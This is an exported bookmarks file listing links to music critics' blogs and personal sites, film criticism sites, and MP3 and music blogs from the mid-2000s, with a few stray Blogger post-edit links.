<DT><A HREF="http://tiny.abstractdynamics.org/" ADD_DATE="1110189309" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jessica Hopper</A>
<DT><A HREF="http://www.people.fas.harvard.edu/~hhsu/" ADD_DATE="1120805187" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Hua Hsu</A>
<DT><A HREF="http://www.people.fas.harvard.edu/~hhsu/blog.html" ADD_DATE="1128218652" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">to here knows when</A>
<DT><A HREF="http://tomhull.com/" ADD_DATE="1106279257" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tom Hull</A>
<DT><A HREF="http://www.woebot.com/" ADD_DATE="1131541589" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Woebot</A>

<DT><A HREF="http://www.hollowearth.org/blog.html" ADD_DATE="1142007868" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">TWANBOC</A>
<DT><A HREF="http://ohmanchester.blogspot.com/" ADD_DATE="1103940156" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Thomas Inskeep</A>
<DT><A HREF="http://rockmetonight.blogspot.com/" ADD_DATE="1107018067" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rock Me Tonight</A>
<DT><A HREF="http://www.washingtoncitypaper.com/archives/indc/indcarch.html#What" ADD_DATE="1114164442" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mark Jenkins</A>
<DT><A HREF="http://www.lynnedjohnson.com/diary/" ADD_DATE="1107786467" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Lynne d Johnson</A>
<DT><A HREF="http://www.knopps.com" ADD_DATE="1154078412" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Steve and Melissa Knopper</A>
<DT><A HREF="http://www.myspace.com/frankkogan" ADD_DATE="1103979229" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Frank Kogan's</A>
<DT><A HREF="http://www.ellipsis.cx/~kortbein/blog/" ADD_DATE="1102919957" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Josh Kortbein</A>
<DT><A HREF="http://k-punk.abstractdynamics.org/" ADD_DATE="1110648751" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">k-punk</A>

<DT><A HREF="http://hellocolaboy.blogspot.com/" ADD_DATE="1149237115" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Joseph Kyle</A>
<DT><A HREF="http://hometown.aol.com/Seeno99/Tomslist.html" ADD_DATE="1137845431" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tom Lane</A>
<DT><A HREF="http://chemistryclass.blogspot.com/" ADD_DATE="1128518466" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Prof. Drew Ledrew</A>
<DT><A HREF="http://lauralevine.com/index.php" ADD_DATE="1148308745" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Laura Levine</A>
<DT><A HREF="http://mannsworld.blogspot.com/" ADD_DATE="1113865912" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mann's World</A>
<DT><A HREF="http://www.base58.com/index.html" ADD_DATE="1109263605" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Steve Mannion</A>
<DT><A HREF="http://marblevenus.net/index.html" ADD_DATE="1114216839" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Marble Venus</A>
<DT><A HREF="http://citypages.com/" ADD_DATE="1154902594" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Greil Marcus</A>
<DT><A HREF="http://dir.salon.com/topics/greil_marcus/index.html" ADD_DATE="1118273073" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Real Life</A>

<DT><A HREF="http://babelogue.citypages.com:8080/dmarsh/" ADD_DATE="1119952116" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Dave Marsh</A>
<DT><A HREF="http://www.starpolish.com/advice/?tab=2&id=67" ADD_DATE="1135487035" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">American Grandstand</A>
<DT><A HREF="http://www.joematera.com/" ADD_DATE="1128699569" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Joe Matera</A>
<DT><A HREF="http://groups.yahoo.com/group/thismusicismylife/" ADD_DATE="1148087792" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Emmet Matheson</A>
<DT><A HREF="http://m-matos.blogspot.com/" ADD_DATE="1139605047" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Michaelangelo Matos</A>
<DT><A HREF="http://boogiefever.blogspot.com/" ADD_DATE="1118364462" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Boogie Fever</A>
<DT><A HREF="http://www.furia.com/twas/index.html" ADD_DATE="1152723445" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">glenn mcdonald</A>
<DT><A HREF="http://www.joelmciver.co.uk/" ADD_DATE="1146215059" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Joel McIver</A>
<DT><A HREF="http://kembrew.com/" ADD_DATE="1128502629" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kembrew McLeod</A>

<DT><A HREF="http://www.rockandrollbadboy.com/" ADD_DATE="1113277489" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Brett Meisner</A>
<DT><A HREF="http://www.angelfire.com/ny4/ungodlyvision/rants/article7.htm" ADD_DATE="1114182568" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Richard Meltzer</A>
<DT><A HREF="http://www.offtherecordbook.com/" ADD_DATE="1134730744" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">David Menconi</A>
<DT><A HREF="http://www.londoning.com/ned.html" ADD_DATE="1144767935" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">John Mendelssohn</A>
<DT><A HREF="http://www.mickmercer.com/" ADD_DATE="1156139293" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mick Mercer</A>
<DT><A HREF="http://anthonyisright.blogspot.com" ADD_DATE="1138619758" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mr. Miccio</A>
<DT><A HREF="http://www.tangmonkey.com/blogs/music/" ADD_DATE="1151734860" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sean Michaels</A>
<DT><A HREF="http://www.tangmonkey.com/" ADD_DATE="1110052591" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tang Monkey</A>
<DT><A HREF="http://deamous.blogspot.com/" ADD_DATE="1146355082" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Chris Neal</A>

<DT><A HREF="http://www.theblankgeneration.blogspot.com/" ADD_DATE="1145562128" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">the noiseboy</A>
<DT><A HREF="http://enthuse.blogspot.com/" ADD_DATE="1113980678" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Edward O</A>
<DT><A HREF="http://o_nate.pitas.com/" ADD_DATE="1149223897" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">O' Nate</A>
<DT><A HREF="http://pages.prodigy.net/briank.o/Writing.htm" ADD_DATE="1156159737" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Brian O'Neill</A>
<DT><A HREF="http://www.kristenpasculli.com/" ADD_DATE="1102966650" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kristen Pasculli</A>
<DT><A HREF="http://natepatrin.blogspot.com/" ADD_DATE="1126818185" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nate Patrin</A>
<DT><A HREF="http://apawboy.blogspot.com/" ADD_DATE="1124427060" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ian Penman</A>
<DT><A HREF="http://djperry.blogspot.com/" ADD_DATE="1151224252" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Dan Perry</A>
<DT><A HREF="http://www.pondoftunes.blogspot.com/" ADD_DATE="1140632954" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pond of Tunes</A>

<DT><A HREF="http://popism.blogspot.com/" ADD_DATE="1133639522" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Popism</A>
<DT><A HREF="http://www.martinpopoff.com/" ADD_DATE="1105189948" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Martin Popoff</A>
<DT><A HREF="http://www.popshots.org/" ADD_DATE="1135284404" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">popshots</A>
<DT><A HREF="http://eensyweensy.blogspot.com/" ADD_DATE="1151861452" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ann Powers</A>
<DT><A HREF="http://www.markprindle.com/" ADD_DATE="1125090921" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mark Prindle</A>
<DT><A HREF="http://www.markp.blogspot.com/" ADD_DATE="1110520295" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mark Pytlik</A>
<DT><A HREF="http://scrape.blogspot.com/" ADD_DATE="1120309878" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Dave Queen</A>
<DT><A HREF="http://blackmailismylife.com/blog/" ADD_DATE="1112927569" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">J.T. Ramsay</A>
<DT><A HREF="http://www.bryanreesman.com/" ADD_DATE="1150074200" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">BryanReesman.com</A>

<DT><A HREF="http://blissout.blogspot.com/" ADD_DATE="1138623198" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Simon Reynolds</A>
<DT><A HREF="http://www.artsjournal.com/riley/" ADD_DATE="1105399871" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tim Riley</A>
<DT><A HREF="http://users.rcn.com/skal//blogriley.html" ADD_DATE="1136038115" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">is here</A>
<DT><A HREF="http://bigpicture.typepad.com/writing/music/index.html" ADD_DATE="1106874683" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Barry Ritholtz</A>
<DT><A HREF="http://waynerobins.blogspot.com/" ADD_DATE="1118626217" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Wayne Robins</A>
<DT><A HREF="http://www.inksyndicate.com/rock/" ADD_DATE="1150169540" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Robot Rock Critic</A>
<DT><A HREF="http://www.livejournal.com/users/rock_vomit/" ADD_DATE="1141554285" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rock Vomit</A>
<DT><A HREF="http://www.phil4living.com/" ADD_DATE="1103143009" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tiger Roholt</A>
<DT><A HREF="http://www.dancemusic.blogspot.com/" ADD_DATE="1146057690" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Dennis Romero</A>

<DT><A HREF="http://www.jukeboxgraduate.com/" ADD_DATE="1119922899" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Caryn Rose</A>
<DT><A HREF="http://theanachronist.blogspot.com" ADD_DATE="1154826726" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jody Rosen</A>
<DT><A HREF="http://squalor.blogspot.com/" ADD_DATE="1156059139" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jody Beth Rosen</A>
<DT><A HREF="http://www.therestisnoise.com/" ADD_DATE="1106026838" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Alex Ross</A>
<DT><A HREF="http://begonias.typepad.com/srubio/" ADD_DATE="1140137711" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Steven Rubio</A>
<DT><A HREF="http://tm3am.com/" ADD_DATE="1109788673" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Andre Salles</A>
<DT><A HREF="http://ellensander.com/mainframe.html" ADD_DATE="1155199593" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ellen Sander</A>
<DT><A HREF="http://smellsliketeenmusic.blogspot.com/" ADD_DATE="1136046305" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Smells Like Teen Music</A>
<DT><A HREF="http://www.indiecrit.com/indiecrit/index.htm" ADD_DATE="1112704180" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">John Scalzi</A>

<DT><A HREF="http://babelogue.citypages.com:8080/pscholtes/" ADD_DATE="1121766634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Peter S. Scholtes</A>
<DT><A HREF="http://skotrok.blogspot.com/" ADD_DATE="1100222221" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Scott Seward</A>
<DT><A HREF="http://www.urbanhonking.com/cowboyz/" ADD_DATE="1103677289" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Julianne Shepherd</A>
<DT><A HREF="http://www.philipsherburne.com/" ADD_DATE="1102148445" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">philip sherburne</A>
<DT><A HREF="http://www.herjazz.org/sara/" ADD_DATE="1133810600" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sara Sherr</A>
<DT><A HREF="http://www.katesilver.blogspot.com/" ADD_DATE="1108816094" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kate Silver</A>
<DT><A HREF="http://web.pitas.com/tashlan/" ADD_DATE="1137381706" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mark Sinker</A>
<DT><A HREF="http://www.netweed.com/hiphoplogic/" ADD_DATE="1125420909" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Clyde Smith</A>
<DT><A HREF="http://www.stateoftheunion.net/" ADD_DATE="1133855873" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Craig Smith</A>

<DT><A HREF="http://nakedcartwheels.blogspot.com/" ADD_DATE="1147850859" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Danyel Smith</A>
<DT><A HREF="http://www.dickdestiny.com/blog/dickdestiny.html" ADD_DATE="1145679645" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Dick Destiny</A>
<DT><A HREF="http://www.soci.niu.edu/~crypt/" ADD_DATE="1146732299" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Welcome to the Crypt Newsletter</A>
<DT><A HREF="http://www.hiphopmusic.com/" ADD_DATE="1137673915" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">jay smooth</A>
<DT><A HREF="http://www.dsng.net/arts/" ADD_DATE="1124051699" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">daryl sng</A>
<DT><A HREF="http://somedisco.blogspot.com/" ADD_DATE="1152081027" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">somedisco</A>
<DT><A HREF="http://agrandillusion.blogspot.com/" ADD_DATE="1113460887" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Alfred Soto</A>
<DT><A HREF="http://auspiciousfish.blogspot.com/" ADD_DATE="1130875240" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nick Southall</A>
<DT><A HREF="http://spizzazzz.blogspot.com/" ADD_DATE="1110456101" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">spizzazz</A>

<DT><A HREF="http://www.musiconthemenu.com/" ADD_DATE="1103379283" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Alan K. Stout</A>
<DT><A HREF="http://yanceystrickler.com/" ADD_DATE="1112178381" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Yancey Strickler</A>
<DT><A HREF="http://www.denisesullivan.com/" ADD_DATE="1113547967" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Denise Sullivan</A>
<DT><A HREF="http://katesullivan.blogspot.com/" ADD_DATE="1149385830" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kate Sullivan</A>
<DT><A HREF="http://www.freshtuneage.com/cgi-bin/blosxom.cgi" ADD_DATE="1132050138" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Michael Sullivan</A>
<DT><A HREF="http://www.villagevoice.com/blogs/riffraff/" ADD_DATE="1108123550" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nick Sylvester</A>
<DT><A HREF="http://steveterrell.blogspot.com/" ADD_DATE="1145193825" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Stephen W. Terrell</A>
<DT><A HREF="http://www.criticalcondition.live.com.au/" ADD_DATE="1138025834" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Andrew Tij</A>
<DT><A HREF="http://www.jltjlt.blogspot.com/" ADD_DATE="1148210119" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Josh Timmermann</A>

<DT><A HREF="http://www.stylusmagazine.com/blog/" ADD_DATE="1154931356" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The turntable</A>
<DT><A HREF="http://freewayjam.blogspot.com/" ADD_DATE="1132974283" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">uao</A>
<DT><A HREF="http://www.jaanuhelszki.com/sobent/jaanuhelszki/html/index.htm" ADD_DATE="1124005280" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jaan Uhelszki</A>
<DT><A HREF="http://www.richieunterberger.com/whatsnew.html" ADD_DATE="1107384392" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Richie Unterberger</A>
<DT><A HREF="http://utopianturtletop.blogspot.com/" ADD_DATE="1154689774" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">uTopian TurtleTop</A>
<DT><A HREF="http://www.aidinvaziri.com/" ADD_DATE="1124176358" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Aidin Vaziri</A>
<DT><A HREF="http://www.angelfire.com/music2/greggwager/" ADD_DATE="1111010539" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Gregg Wager</A>
<DT><A HREF="http://o-dub.com/" ADD_DATE="1156787076" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Oliver Wang</A>
<DT><A HREF="http://www.weblogsky.com/berlinbites/" ADD_DATE="1157935816" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ed Ward</A>

<DT><A HREF="http://www.popmatters.com/columns/archive.shtml" ADD_DATE="1119775490" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Simon Warner</A>
<DT><A HREF="http://radioweisblogg.blogspot.com/" ADD_DATE="1133917639" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">radio weisblogg</A>
<DT><A HREF="http://wblogg.blogspot.com/" ADD_DATE="1123105582" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">weisblogg [2002-03]</A>
<DT><A HREF="http://popwherry.blogspot.com" ADD_DATE="1153580220" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">aaron wherry</A>
<DT><A HREF="http://www.paulwilliams.com/" ADD_DATE="1121517355" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Paul Williams</A>
<DT><A HREF="http://everybodysacritic.blogspot.com/" ADD_DATE="1108534083" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rohan Williams</A>
<DT><A HREF="http://www.warr.org/cgi-bin/randompickpan.cgi" ADD_DATE="1140061376" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Wilson & Allroy</A>
<DT><A HREF="http://www.zoilus.com/" ADD_DATE="1159140127" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Carl Wilson</A>

<DT><A HREF="http://www.rensselaer.edu/~winner/" ADD_DATE="1132534640" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Langdon Winner</A>
<DT><A HREF="http://www.lacunae.com/" ADD_DATE="1131891260" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Douglas Wolk</A>
<DT><A HREF="http://unfinishednovellas.blogspot.com/" ADD_DATE="1112349870" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jonathan Wright</A>
<DT><A HREF="http://rockcriticslinks.blogspot.com/2006/05/mostly-music-blogs.html" ADD_DATE="1103158736" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">scott&nbsp;&nbsp;# 10:55 PM</A>
<DT><A HREF="http://www.blogger.com/post-edit.g?blogID=20555422&amp;postID=114818380260380179&amp;quickEdit=true" ADD_DATE="1142296218" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"><span class="quick-edit-icon">&nbsp;</span></A>
<DT><A HREF="http://lisarosman.blogspot.com/" ADD_DATE="1115678011" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Broad View</A>
<DT><A HREF="http://www.cinemarati.org/" ADD_DATE="1115285975" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Cinemarati</A>
<DT><A HREF="http://cinebeats.blogsome.com/" ADD_DATE="1155793043" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Cinebeats: Confession of a Cinephile</A>
<DT><A HREF="http://www.cinephiliac.com/" ADD_DATE="1104812698" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Cinephiliac</A>

<DT><A HREF="http://filmbrain.typepad.com/" ADD_DATE="1147284971" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Filmbrain</A>
<DT><A HREF="http://filmcritic.com/" ADD_DATE="1103665450" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">filmcritic.com</A>
<DT><A HREF="http://www.filmfreakcentral.net/" ADD_DATE="1149955381" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Film Freak Central</A>
<DT><A HREF="http://www.thefilmjournal.com/" ADD_DATE="1125059661" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The Film Journal</A>
<DT><A HREF="http://home.comcast.net/~flickhead/index.html" ADD_DATE="1151824426" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Flickhead</A>
<DT><A HREF="http://www.girishshambu.com/blog/" ADD_DATE="1144635593" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Girish</A>
<DT><A HREF="http://daily.greencine.com/" ADD_DATE="1157982802" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">GreenCine Daily</A>
<DT><A HREF="http://mattzollerseitz.blogspot.com/" ADD_DATE="1115578562" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">The House Next Door</A>
<DT><A HREF="http://tsutpen.blogspot.com/" ADD_DATE="1151968843" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">If Charlie Parker Was a Gunslinger, There'd Be a Whole Lot of Dead Copycats</A>

<DT><A HREF="http://imdb.com/" ADD_DATE="1152421432" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Internet Movie Database</A>
<DT><A HREF="http://rockcritics.com/archives/kael.html" ADD_DATE="1139703778" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pauline Kael</A>
<DT><A HREF="http://davekehr.com/" ADD_DATE="1102728238" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Dave Kehr</A>
<DT><A HREF="http://www.rickmcginnis.com/" ADD_DATE="1148957365" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rick McGinnis.com</A>
<DT><A HREF="http://rockcritics.com/archives/moviecritics.html" ADD_DATE="1137388450" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Movie Critic interviews and</A>
<DT><A HREF="http://www.notesoncinema.com/" ADD_DATE="1122452586" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Notes on Cinema</A>
<DT><A HREF="http://pullquote.typepad.com/" ADD_DATE="1122623861" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">pullquote</A>
<DT><A HREF="http://www.rottentomatoes.com/" ADD_DATE="1100242889" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rotten Tomatoes</A>
<DT><A HREF="http://www.sensesofcinema.com/" ADD_DATE="1115781663" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Senses of Cinema</A>

<DT><A HREF="http://sergioleoneifr.blogspot.com/" ADD_DATE="1144090073" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sergio Leone and the Infield Fly Rule</A>
<DT><A HREF="http://www.bfi.org.uk/sightandsound/" ADD_DATE="1108725830" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sight and Sound</A>
<DT><A HREF="http://roundheadedboy.blogspot.com/" ADD_DATE="1155791896" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">That Little Round-Headed Boy</A>
<DT><A HREF="http://theyshootpictures.com/index.htm" ADD_DATE="1142979057" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">They Shoot Pictures, Don't They?</A>
<DT><A HREF="http://rockcriticslinks.blogspot.com/2006/05/film-freaks.html" ADD_DATE="1141209327" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">scott&nbsp;&nbsp;# 10:54 PM</A>
<DT><A HREF="http://www.blogger.com/post-edit.g?blogID=20555422&amp;postID=114818394866337984&amp;quickEdit=true" ADD_DATE="1127432013" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"><span class="quick-edit-icon">&nbsp;</span></A>
<DT><A HREF="http://www.americanrhetoric.com/top100speechesall.html" ADD_DATE="1155277785" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">American Rhetoric</A>
<DT><A HREF="http://www.boomselection.info/" ADD_DATE="1144316921" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">boom selection</A>
<DT><A HREF="http://www.bubblegum-machine.com/" ADD_DATE="1109477088" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Bubblegum Machine</A>

<DT><A HREF="http://sm-woods.blogspot.com/" ADD_DATE="1110704652" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Canada's Only Webcast</A>
<DT><A HREF="http://archives.cbc.ca/270s.asp?IDLan=1" ADD_DATE="1159551753" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">CBC Archives</A>
<DT><A HREF="http://copycommaright.blogspot.com/" ADD_DATE="1105018988" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Copy, Right?</A>
<DT><A HREF="http://bigpicture.typepad.com/writing/2004/07/more_mp3_blogs.html" ADD_DATE="1115466207" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">essays & effluvia: 100 mp3 blogs</A>
<DT><A HREF="http://fingertipsmusic.blogspot.com/" ADD_DATE="1146585581" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Fingertips</A>
<DT><A HREF="http://www.fluxblog.org" ADD_DATE="1108633295" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Fluxblog</A>
<DT><A HREF="http://gohomeproductions.com/" ADD_DATE="1105170444" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Go Home Productions</A>
<DT><A HREF="http://www.kiddierecords.com/" ADD_DATE="1111394098" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kiddie Records Weekly</A>

<DT><A HREF="http://www.moistworks.com/" ADD_DATE="1100206577" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Moistworks</A>
<DT><A HREF="http://moviewavs.com/" ADD_DATE="1149754895" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Movie Wavs</A>
<DT><A HREF="http://music.for-robots.com/" ADD_DATE="1109125757" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">music (for robots)</A>
<DT><A HREF="http://spreadin.blogspot.com/" ADD_DATE="1115733997" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">new (ish)</A>
<DT><A HREF="http://songz.blogspot.com/" ADD_DATE="1141472595" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">No Frontin', Just Music</A>
<DT><A HREF="http://zoo.glashaus.ch/prequel/" ADD_DATE="1101296046" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Rap History</A>
<DT><A HREF="http://recordbrother.typepad.com/imagesilike/" ADD_DATE="1155386632" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Record Brother</A>
<DT><A HREF="http://www.tangmonkey.com/blogs/music/" ADD_DATE="1144149690" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Said the Gramophone</A>
<DT><A HREF="http://scopitones.com/" ADD_DATE="1150202268" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Scopitones</A>

<DT><A HREF="http://www.stereogum.com/" ADD_DATE="1132523939" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Stereogum</A>
<DT><A HREF="http://www.stylusmagazine.com/ipod/" ADD_DATE="1106351133" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">the stypod</A>
